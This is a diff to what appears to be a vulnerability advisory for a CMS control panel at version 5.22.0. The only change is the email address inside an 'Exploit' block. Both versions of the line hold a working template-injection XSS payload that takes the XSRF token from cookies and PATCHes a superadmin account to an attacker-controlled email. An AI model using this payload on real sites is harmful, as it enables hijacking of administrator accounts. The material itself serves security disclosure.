@@ -86,7 +86,7 @@ In the latest version (5.22.0), the password change mechanism was hardened by re
 **Exploit:**
 
 ```javascript
-{{constructor.constructor("(function(){function getXsrfToken(){var token=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);return token.endsWith('%3D')?token.replace(/%3D$/, '='):token;}var req=new XMLHttpRequest();req.onload=function(){var changeReq=new XMLHttpRequest();changeReq.open('PATCH','http://0.0.0.0/cp/users/<Superadmin's UUID>',true);changeReq.setRequestHeader('Content-Type','application/json');changeReq.setRequestHeader('X-Requested-With','XMLHttpRequest');changeReq.setRequestHeader('X-XSRF-TOKEN',getXsrfToken());changeReq.send(JSON.stringify({name:'wojt',email:'wojt.chwala@gmail.com',roles:[],groups:[],id:'9f4d7960-bf66-4af4-8c30-b09eb24e06ea'}));};req.open('GET','/cp/users/<Superadmin's UUID>/edit',true);req.send();})()")()}}
+{{constructor.constructor("(function(){function getXsrfToken(){var token=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);return token.endsWith('%3D')?token.replace(/%3D$/, '='):token;}var req=new XMLHttpRequest();req.onload=function(){var changeReq=new XMLHttpRequest();changeReq.open('PATCH','http://0.0.0.0/cp/users/<Superadmin's UUID>',true);changeReq.setRequestHeader('Content-Type','application/json');changeReq.setRequestHeader('X-Requested-With','XMLHttpRequest');changeReq.setRequestHeader('X-XSRF-TOKEN',getXsrfToken());changeReq.send(JSON.stringify({name:'wojt',email:'wojtek@wojtek.com',roles:[],groups:[],id:'9f4d7960-bf66-4af4-8c30-b09eb24e06ea'}));};req.open('GET','/cp/users/<Superadmin's UUID>/edit',true);req.send();})()")()}}
 ```
 
 ### Impact
